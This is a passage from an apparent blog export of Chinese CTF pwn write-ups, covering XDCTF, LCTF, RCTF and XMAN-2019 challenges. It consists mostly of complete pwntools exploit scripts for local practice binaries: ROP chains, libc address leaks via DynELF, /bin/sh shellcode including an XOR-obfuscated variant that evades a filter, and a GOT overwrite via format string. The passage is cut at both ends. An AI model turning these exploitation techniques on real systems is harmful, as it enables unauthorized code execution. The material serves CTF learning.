+= c up = c data = buf[:4] #取指定字节数 log.info(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return data （2）puts输出完后还有其他输出，在这种情况下的leak函数可以这么写。 1234567891011121314151617181920def leak(address): count = 0 data = \"\" payload = xxx p.send(payload) print p.recvuntil(\"xxxn\")) #一定要在puts前释放完输出 up = \"\" while True: c = p.recv(1) count += 1 if up == 'n' and c == \"x\": #一定要找到泄漏信息的字符串特征 data = buf[:-1] data += \"x00\" break else: buf += c up = c data = buf[:4] log.info(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return data 其他需要注意的地址 在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈。 XDCTF2015-pwn200 本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下借助DynELF实现利用的要点： 1）调用write函数来泄露地址信息，比较方便； 2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便； 3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈； 4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。 接下来就直接给出利用代码。 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *import binasciip = process(\"./xdctf-pwn200\")elf = ELF(\"./xdctf-pwn200\")writeplt = elf.symbols['write']writegot = elf.got['write']readplt = elf.symbols['read']readgot = elf.got['read']vulnaddress = 0x08048484 startaddress = 0x080483d0 #调用start函数，用以恢复栈bssaddress = 0x0804a020 #用来写入“/bin/sh”字符串def leak(address): payload = \"A\" * 112 payload += p32(writeplt) payload += p32(vulnaddress) payload += p32(1) payload += p32(address) payload += p32(4) p.send(payload) data = p.recv(4) print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) return dataprint p.recvline()dynelf = DynELF(leak, elf=ELF(\"./lctf-pwn200\"))systemAddress = dynelf.lookup(\"__libc_system\", \"libc\") print \"systemAddress:\", hex(systemAddress)#调用_start函数，恢复栈payload1 = \"A\" * 112payload1 += p32(startaddress) p.send(payload1)print p.recv()ppprAddress = 0x0804856c #获取到的连续3次pop操作的gadget的地址 payload1 = \"A\" * 112payload1 += p32(readplt)payload1 += p32(ppprAddress)payload1 += p32(0)payload1 += p32(bssaddress)payload1 += p32(8)payload1 += p32(systemAddress) + p32(vulnaddress) + p32(bssaddress)p.send(payload1)p.send('/bin/sh')p.interactive() LCTF2016-pwn100 本题是64位linux下的二进制程序，无cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和上一题相比，存在两处差异： 1）64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局； 2）puts函数与write函数不同，不能指定输出字符串的长度。 根据上文给出的解决方法，构造利用脚本如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *import binasciip = process(\"./pwn100\")elf = ELF(\"./pwn100\")readplt = elf.symbols['read']readgot = elf.got['read']putsplt = elf.symbols['puts']putsgot = elf.got['puts']mainaddress = 0x4006b8startaddress = 0x400550poprdi = 0x400763pop6address = 0x40075a movcalladdress = 0x400740waddress = 0x601000 #可写的地址，bss段地址在我这里好像不行，所以选了一个别的地址，应该只要不是readonly的地址都可以 def leak(address): count = 0 data = '' payload = \"A\" * 64 + \"A\" * 8 payload += p64(poprdi) + p64(address) payload += p64(putsplt) payload += p64(startaddress) payload = payload.ljust(200, \"B\") p.send(payload) print p.recvuntil('bye~n') up = \"\" while True: c = p.recv(numb=1, timeout=0.5) count += 1 if up == 'n' and c == \"\": data = data[:-1] data += \"x00\" break else: data += c up = c data = data[:4] log.info(\"%#x =&gt; %s\" % (address, (data or '').encode('hex'))) return datad = DynELF(leak, elf=ELF('./pwn100'))systemAddress = d.lookup('__libc_system', 'libc')print \"systemAddress:\", hex(systemAddress)print \"-----------write /bin/sh to bss--------------\"payload1 = \"A\" * 64 + \"A\" * 8payload1 += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(waddress) + p64(0)payload1 += p64(movcalladdress)payload1 += 'x00'*56payload1 += p64(startaddress)payload1 = payload1.ljust(200, \"B\")p.send(payload1)print p.recvuntil('bye~n')p.send(\"/bin/shx00\")print \"-----------get shell--------------\"payload2 = \"A\" * 64 + \"A\" * 8payload2 += p64(poprdi) + p64(waddress)payload2 += p64(systemAddress)payload2 += p64(startaddress)payload2 = payload2.ljust(200, \"B\")p.send(payload2)p.interactive() RCTF2015-welpwn 本题也是64位linux下的二进制程序，无cookie，也存在明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，与其他两题的区别主要在于利用过程比较绕。 整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含“x00”字符。 这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程，具体脚本如下。 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *import binasciip = process(\"./welpwn\")elf = ELF(\"welpwn\")readplt = elf.symbols[\"read\"]readgot = elf.got[\"read\"]writeplt = elf.symbols[\"write\"]writegot = elf.got[\"write\"]startAddress = 0x400630popr12r13r14r15 = 0x40089cpop6address = 0x40089amovcalladdress = 0x400880def leak(address): print p.recv(1024) payload = \"A\" * 24 payload += p64(popr12r13r14r15) payload += p64(pop6address) + p64(0) + p64(1) + p64(writegot) + p64(8) + p64(address) + p64(1) payload += p64(movcalladdress) payload += \"A\" * 56 payload += p64(startAddress) payload = payload.ljust(1024, \"C\") p.send(payload) data = p.recv(4) print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) return datadynelf = DynELF(leak, elf=ELF(\"./welpwn\"))systemAddress = dynelf.lookup(\"__libc_system\", \"libc\")print hex(systemAddress)bssAddress = 0x601070poprdi = 0x4008a3print p.recv(1024)payload = \"A\" * 24payload += p64(popr12r13r14r15)payload += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(bssAddress) + p64(0)payload += p64(movcalladdress)payload += \"A\" * 56payload += p64(poprdi)payload += p64(bssAddress)payload += p64(systemAddress)payload = payload.ljust(1024, \"C\")p.send(payload)p.send(\"/bin/shx00\")p.interactive() 由于该题目程序中也包含puts函数，故我们也可以用puts函数来实现leak，代码如下。 123456789101112131415161718192021222324252627def leak(address): count = 0 data = '' print p.recv(1024) payload = \"A\" * 24 payload += p64(popr12r13r14r15) payload += p64(poprdi) + p64(address) payload += p64(putsplt) payload += p64(startAddress) payload = payload.ljust(1020, \"B\") p.send(payload) #由于echo函数最后会输出复制过去的字符串，而该字符串是popr12r13r14r15，故我们可以将该gadget的地址作为判断输出结束的依据 print p.recvuntil(\"x9cx08x40\") up = \"\" while True: c = p.recv(1) count += 1 if up == 'n' and c == \"W\": #下一轮输出的首字母就是“Welcome”中的“W” data = data[:-1] data += \"x00\" break else: data += c up = c data = data[:4] print \"%#x =&gt; %s\" % (address, (data or '').encode('hex')) return data","categories":[],"tags":[]},{"title":"XMAN-2019-福州-PWN-stackoverflow（上）","slug":"XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐","date":"2019-08-06T14:34:45.000Z","updated":"2019-08-07T05:38:02.000Z","comments":true,"path":"2019/08/06/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐/","link":"","permalink":"http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-stackoverflowú¿╔╧ú⌐/","excerpt":"","text":"今天上午的讲的基础ROP十分有趣啊，从普通的栈溢出simple_stackoverflow2到ROP的simple_stackoverflow2_nx过渡十分自然，同样的代码，只因为开启了不同的防护手段，就有完全不同的攻击手法，就很有趣。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU simple_stackoverflow先看看源代码 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[1024];int overflow()&#123; char overflow[24]; read(0, buf, 1023); read(0, overflow, 1023); return 0;&#125;int main()&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); overflow();&#125; IDA Pro反汇编出来的代码 12345678910111213141516int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(_bss_start, 0); overflow(); return 0;&#125;int overflow()&#123; char buf; // [esp+8h] [ebp-20h] read(0, &amp;::buf, 0x3FFu); read(0, &amp;buf, 0x3FFu); return 0;&#125; 检查一下开启的保护措施 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 可以得知存在非常明显的栈溢出漏洞，只要第一次把shellcode写入全局的buf内存中，第二次通过栈溢出覆盖返回地址，使流程跳转到shellcode地址处执行shellcode代码即可。 通过计算得出栈的大小应该为0x20 = 32,然后因为32位机器加上4个字节即为36，也可以通过工具中的 pattern.py脚本计算得出。 使用pattern.py脚本首先生成字符串 12syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py create 150Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9 然后通过gdb调试程序，在输入点输入字符串，然后可以得到溢出的内存地点 123Legend: code, data, rodata, valueStopped reason: SIGSEGV0x41326241 in ?? () 然后通过脚本计算溢出点 123syc@ubuntu:~/git/XMAN-2019-FZU/工具$ python pattern.py offset 0x41326241hex pattern decoded as: Ab2A36 通过IDA Pro可以找到全局buf的地址为0x804a060 则我们的payload可以这样写 36 * &#39;A&#39;+p32(0x804a060) 最终的Exploit 1234567from pwn import *sh = process('./simple_stackoverflow')shellcode = asm(shellcraft.sh())buf2_addr = 0x804a060sh.sendline(shellcode)sh.sendline(36 * 'A' + p32(buf2_addr))sh.interactive() simple_stackoverflow2先看看源代码 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[1024];int overflow()&#123; char overflow[24]; read(0, buf, 1023); read(0, overflow, 1023); return 0;&#125;int main()&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); overflow();&#125; 然后看看IDA反汇编出来的代码 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); return overflow();&#125;int overflow()&#123; char buf; // [esp+18h] [ebp-20h] read(0, &amp;buf, 0x3FFu); return 0;&#125; 检查一下开启的保护措施 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 可以得知存在非常明显的栈溢出漏洞，但是这一次没有全局可写的buf地址，我们先看看我们有什么可以利用的点，可以进行ROP 1234567891011121314syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2$ objdump -R simple_stackoverflow2simple_stackoverflow2: file format elf32-i386DYNAMIC RELOCATION RECORDSOFFSET TYPE VALUE 08049ffc R_386_GLOB_DAT __gmon_start__0804a040 R_386_COPY stderr@@GLIBC_2.00804a044 R_386_COPY stdin@@GLIBC_2.00804a060 R_386_COPY stdout@@GLIBC_2.00804a00c R_386_JUMP_SLOT setbuf@GLIBC_2.00804a010 R_386_JUMP_SLOT read@GLIBC_2.00804a014 R_386_JUMP_SLOT __gmon_start__0804a018 R_386_JUMP_SLOT __libc_start_main@GLIBC_2.0 可以发现有一个read函数可以利用并且程序也没有开启地址随机化，这样我们只需要在溢出时跳转到read函数的地址调用read函数在buf读入shellcode，然后控制read函数的返回地址为buf继续执行shellcode就完成了 首先read函数ssize_t read [1] (int fd, void *buf, size_t count); 我们需要将第一个参数置为1，第二个参数为要写入的buf地址，第三个为buf的大小 于是就有p32(0)+p32(buf2_addr)+p32(0x100) 然后因为还需要控制read函数的返回地址到buf处 于是就有36 *&quot;a&quot; + p32(e.symbols[&quot;read&quot;]) + p32(buf2_addr) 最终的Exploit 123456789101112#!/usr/bin/env pythonfrom pwn import *sh = process('./simple_stackoverflow2')#gdb.attach(sh)e = ELF('./simple_stackoverflow2')buf2_addr = 0x0804a100payload1 = 36 *\"a\" + p32(e.symbols[\"read\"]) + p32(buf2_addr)payload1 += p32(0)+p32(buf2_addr)+p32(0x100)sh.sendline(payload1)shellcode = asm(shellcraft.sh())sh.sendline(shellcode)sh.interactive() simple_stackoverflow2_nx先看看源代码 1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[1024];int overflow()&#123; char overflow[24]; read(0, buf, 1023); read(0, overflow, 1023); return 0;&#125;int main()&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); overflow();&#125; 然后看看IDA反汇编出来的代码 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); return overflow();&#125;int overflow()&#123; char buf; // [esp+18h] [ebp-20h] read(0, &amp;buf, 0x3FFu); return 0;&#125; 检查一下开启的保护措施 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 可以看到和上一题最大的不同点就是开启了NX防护，这样子的话我们的栈就变为了不可执行，通过检查也的确是这样的 123456gdb-peda$ vmmapWarning: not runningStart End Perm Name0x0804835c 0x080485e8 rx-p /home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx0x08048154 0x08048714 r--p /home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx0x08049f08 0x0804a06c rw-p /home/syc/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx/simple_stackoverflow2_nx 但是我们依然有办法执行系统调用system(&quot;/bin/sh&quot;) 利用 ropgadget，我们可以查看是否有 /bin/sh 存在 123syc@ubuntu:~/git/XMAN-2019-FZU/日程科目题目/PWN/simple_stackoverflow2_nx$ ROPgadget --binary simple_stackoverflow2_nx --string '/bin/sh' Strings information============================================================ 可以知道不存在/bin/sh 查找一下是否有system 函数存在。经在 ida 中查找，不存在。 那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点 system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下 https://github.com/niklasb/libc-database 所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。 那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。 我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme https://github.com/lieanu/LibcSearcher 此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。 这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下 泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) 我们一般通过write函数来泄漏libc的相关地址信息 write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数。且需注意地址置为要调用的函数地址，注意是got地址而不是plt地址。 则我们的payload1可以写为 1payload = \"A\"*0x24+p32(elf.symbols[\"write\"])+p32(overflow) + p32(1)+p32(elf.got[\"write\"])+p32(12) 因为我们要重复利用overflow函数，故返回地址需要设置为overflow的起始地址 但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write()函数就够了，因为我们可以通过write()函数把中的write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write()会根据write.got跳转到真正的write()函数上去。 因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以根据已知的write()的地址和偏移量计算出system()在内存中的地址了。 偏移量也可以使用pwntools来进行计算 1off_set = libc.symbols['write'] - libc.symbols['__libc_start_main'] 所以libc的基地址也可以计算 1libc_address = write_address - off_set 则我们的payload2可以写为 1payload = \"A\"*0x24+p32(libc.symbols[\"system\"])+p32(0xcafebabe)+p32(libc.search(\"/bin/sh\\x00\").next()) 最终的Exploit为 1234567891011121314151617181920212223from pwn import *def main(): p = process(\"./simple_stackoverflow2_nx\") gdb.attach(p) leave_ret = 0x80484FC#overflow leave ret overflow = 0x080484DB payload = \"A\"*0x24+p32(elf.symbols[\"write\"])+p32(overflow) payload += p32(1)+p32(elf.got[\"write\"])+p32(12) p.send(payload) libc.address = u32(p.recv(4))-0xd5b70 info(\"libc : \" + hex(libc.address)) payload = \"A\"*0x24+p32(libc.symbols[\"system\"])+p32(0xcafebabe)+p32(libc.search(\"/bin/sh\\x00\").next()) p.send(payload) p.interactive()if __name__ == \"__main__\": elf = ELF(\"./simple_stackoverflow2_nx\") libc = ELF(\"./libc.so\") main() 这题的Exploit还有一种写法，我还不是很能理解，到时候我再填坑吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/env python2# -*- coding: utf-8 -*-from pwn import *import timecontext(arch='i386', os='linux', log_level='debug')#context.terminal = ['tmux', 'splitw', '-h']elf = ELF('./simple_stackoverflow2')libc = elf.libcshellcode = asm(shellcraft.i386.linux.sh())ret_addr = 0x0804A060 bss = 0x0804A200write_plt = 0x080483C0read_plt = 0x080483A0read_got = 0x0804A010setbuf_plt = elf.plt['setbuf']setbuf_got = elf.got['setbuf']pppr = 0x080485c9def attach(): gdb.attach(io, \"b *0x80484FD \\nc\")io = process(elf.path) # , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)# io = remote('localhost', 2333)attach()time.sleep(1)payload = p32(write_plt)payload += p32(pppr)payload += p32(1)payload += p32(setbuf_got)payload += p32(0x4)payload += p32(read_plt)payload += p32(pppr)payload += p32(0)payload += p32(setbuf_got)payload += p32(12)payload += p32(setbuf_plt)payload += p32(0xdeadbeef)payload += p32(setbuf_got+4)# io.sendline('a'*36 + p32(ret_addr) + 'a' *32 + shellcode)io.send('a'*36 + payload)time.sleep(1)setbuf_addr = u32(io.read(4))log.info(\"setbuf_addr:%08x\" % setbuf_addr)setbuf_offset = 0x0065ff0libc.address = setbuf_addr - setbuf_offsetlog.info(\"libc:%08x\" % libc.address)payload2 = p32(libc.symbols['system'])payload2 += \"/bin/sh\\x00\"io.send(payload2)io.interactive()","categories":[],"tags":[]},{"title":"XMAN-2019-福州-PWN-ShellCode","slug":"XMAN-2019-╕ú╓▌-PWN-ShellCode","date":"2019-08-06T14:33:47.000Z","updated":"2019-08-07T05:38:10.000Z","comments":true,"path":"2019/08/06/XMAN-2019-╕ú╓▌-PWN-ShellCode/","link":"","permalink":"http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-ShellCode/","excerpt":"","text":"在本次XMAN-2019福州站的夏令营的Pwn专题中，关于ShellCode的题目主要有两题：shellcode和shellcode2，都是很基础的题目。我最喜欢的环节是哪个关于ShellCode如何绕过的互动环节，听到了很多种不同的思路，虽然自己也做出来了，但是没发现大家还有还有这么多不同的思路，感觉自己的思维得到了非常大的拓展。本来PWN题的解法就有很多，十分渴望可以听到各种不同的思路。 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU shellcode首先放源代码 12345678910111213#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char shellcode[1024];int main()&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); read(0, shellcode, 1023); (*(void (*)()) shellcode)();&#125; 通过IDA Pro反汇编出来的代码为 12345678int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); read(0, &amp;shellcode, 0x3FFu); return ((int (*)(void))shellcode)();&#125; 检查一下防护措施 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 可以看到有很明显的攻击漏洞，程序会直接读取我们输入的东西并执行，我们只需要构造ShellCode并传入即可 构造的shellcode应该是这样的,执行的即为system（&quot;/bin/sh\\x00&quot;) 1234567891011xor eax, eaxpush eaxpush 0x68732f2fpush 0x6e69622fmov ebx, esppush eaxpush ebxmov ecx, espcltdmove al, 0xbint 0x80 Exploit如下 1234567891011#!python#!/usr/bin/env pythonfrom pwn import *p = process(\"./shellcode\")#p = remote(\"120.79.114.39\",10001)shellcode = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\"shellcode += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\"shellcode += \"\\x0b\\xcd\\x80\"payload = shellcodep.send(payload)p.interactive() shellcode2首先通过IDA Pro反汇编出来的代码为 1234567891011121314151617181920int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); read(0, shellcode, 0x3FFu); if ( strstr(shellcode, \"sh\") ) &#123; puts(\"shellcode detected!\"); result = -1; &#125; else &#123; (*(void (**)(void))shellcode)(); result = 0; &#125; return result;&#125; 检查一下防护措施 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 和上一题的不同之处在于，这题多了一个对输入内容的检测，如果输入的内容包含“sh“字符就会报错，所以我们要想办法绕过这个检查 我们所想的第一种办法，把我们的/bin/sh字符串进行异或操作，绕过字符检查，然后再异或回原来的字符串即可。shellcode就可以像这样写 123456789xor ecx, ecxmul ecxpush ecxpush 0xa28d9591xor dword ptr [esp],0xcafebabe\"push 0x6e69622fmov ebx, espmov al, 11int 0x80 最后的Exploit就可以这样写 12345678910111213141516171819#!python#!/usr/bin/env pythonfrom pwn import *context(arch='i386', os='linux', log_level='debug')p = process(\"./shellcode2\")#p = remote(\"120.79.114.39\",10002)gdb.attach(p,\"b *0x080485A1\")shellcode = asm(\"xor ecx, ecx\")shellcode += asm(\"mul ecx\")shellcode += asm(\"push ecx\")shellcode += asm(\"push 0xa28d9591\")shellcode += asm(\"xor dword ptr [esp],0xcafebabe\")#dword ptr Four bitsshellcode += asm(\"push 0x6e69622f\")shellcode += asm(\"mov ebx, esp\")shellcode += asm(\"mov al, 11\")shellcode += asm(\"int 0x80\")payload = shellcodep.send(payload)p.interactive() 或者也可以通过类似加加减减的简单变换方式来绕过，核心思路和异或操作是一样的。还可以通过复杂的ROP方式绕过去。","categories":[],"tags":[]},{"title":"XMAN-2019-福州-PWN-format","slug":"XMAN-2019-╕ú╓▌-PWN-format","date":"2019-08-06T14:33:08.000Z","updated":"2019-08-07T05:38:20.000Z","comments":true,"path":"2019/08/06/XMAN-2019-╕ú╓▌-PWN-format/","link":"","permalink":"http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-format/","excerpt":"","text":"format一题，格式化字符串的入门程度我觉得不错，不算太难，也不算太容易，是适合新手的题目，现在发现自己对格式化字符串的利用程度还不够熟练，现在觉得其实格式化字符串也非常考验对栈数据结构的理解。 也学会了一点在执行Exploit的时候带上DEBUG和贴上gdb调试非常有用！ 贴上gdb只需要在代码里面加入gdb.attach(io)，如果要下断点就是gdb.attach(io,&quot;b *address&quot;) 带上DEBUG只需要在命令行后跟上DEBUG参数，例如python exp.py DEBUG 相关资料均可在GitHub上下载：https://github.com/suyucheng-lz/XMAN-2019-FZU 首先看看源代码 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;char buf[1024];int overflow()&#123; char overflow[256] = &#123;0&#125;; read(0, buf, 1023); read(0, overflow, 255); printf(overflow); return 0;&#125;int main()&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); overflow(); puts(\"exit.\");&#125; IDA Pro逆向出来的代码为 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); overflow(); puts(\"exit.\"); return 0;&#125;int overflow()&#123; char buf; // [esp+0h] [ebp-108h] memset(&amp;buf, 0, 0x100u); read(0, &amp;::buf, 0x3FFu); read(0, &amp;buf, 0xFFu); printf(&amp;buf); return 0;&#125; 检查一下文件开启的保护措施 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 没有开启任何的防护措施，就比较简单 本质上是通过构造格式化字符串让劫持系统流程，让系统执行到我们保存shellcode的地址上 所以首先我们需要把shellcode写到内存上的，我们可以发现第一次输入的这个BUF为全局BUF，可以直接写入 故我们第一次输入就把shellcode传入即可 123shellcode = asm(shellcraft.i386.linux.sh())shellcode_addr = 0x0804A080payload = shellcode.ljust(1023, 'a') 然后我们只需要传入我们写入shellcode的地址覆盖掉puts的got地址，这样等到程序运行到puts函数时，实测运行的就是我们的shellcode，现在的问题是如何构造一个格式化字符串覆盖puts的got地址 我们首先构造一个Exploit，确定我们传入的第一个数据是在栈上的第几个位置. 12345678from pwn import *p = process('./format')gdb.attach(p,'b * 0x08048563')shellcode = asm(shellcraft.sh())p.sendline(shellcode)p.sendline('aaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p')#%2552c,%39036c,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%pp.interactive() 根据DEBUG信息我们发送的信息如下 12[DEBUG] Received 0x136 bytes: 'aaaa,0xfff27430,0xff,0x1,0x61616161,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0xa7025,(nil),(nil),(nil)\\n' 接收到的信息如下 1aaaa,0xfff27430,0xff,0x1,0x61616161,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0xa7025,(nil),(nil),(nil) 通过x/32xw $esp命令查看栈情况 123456789gdb-peda$ x/32xw $esp0xffc5e370: 0xffc5e380 0xffc5e380 0x000000ff 0x000000010xffc5e380: 0x61616161 0x2c70252c 0x252c7025 0x70252c700xffc5e390: 0x2c70252c 0x252c7025 0x70252c70 0x2c70252c0xffc5e3a0: 0x252c7025 0x70252c70 0x2c70252c 0x252c70250xffc5e3b0: 0x70252c70 0x2c70252c 0x252c7025 0x70252c700xffc5e3c0: 0x2c70252c 0x252c7025 0x70252c70 0x2c70252c0xffc5e3d0: 0x252c7025 0x70252c70 0x2c70252c 0x000a70250xffc5e3e0: 0x00000000 0x00000000 0x00000000 0x00000000 不难得出我们传入的第一个参数aaaa位于栈中的第4个位置 因为0x0804A018数值太大了，我们把它拆分为2052和39036两个部分传值，现在需要确定的是如果我们再传入puts_got的地址时，puts_got位于栈中的哪个位置。同时因为我们是以双字节形式写入，故2052对应的地址是puts_got，而39036对应的应是puts_got+2的位置 所以我们的格式化字符串就为： &#39;%2052c%12$hn%39036c%11$hn111&#39; + p32(puts_got) + p32(puts_got+2) 分析可得，此时堆栈中的 第一个参数为：%2052c%12$hn%39036c%11$hn111 之后因为是32位系统，每4字节占用一个参数位 第4个参数：%205 第5个参数：c%12 第6个参数：$hn% 第7个参数：3903 第8个参数：6c%1 第9个参数：1$hn 第10个参数：111 第11个参数：原本应为p32(puts_got) 第12个参数：原本应为p32(puts_got)+2 因为%12$n和%11$n ，puts_got的地址被取出且修改为shellcode的地址 最终的Exploit如下 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python2# -*- coding: utf-8 -*-from pwn import *import timecontext(arch='i386', os='linux', log_level='info')elf = ELF('./format')libc = elf.libcshellcode = asm(shellcraft.i386.linux.sh())shellcode_addr = 0x0804A080#全局BUF地址puts_got = 0x804A018ret_addr = 0x0804A060 def attach(): gdb.attach(io,'b * 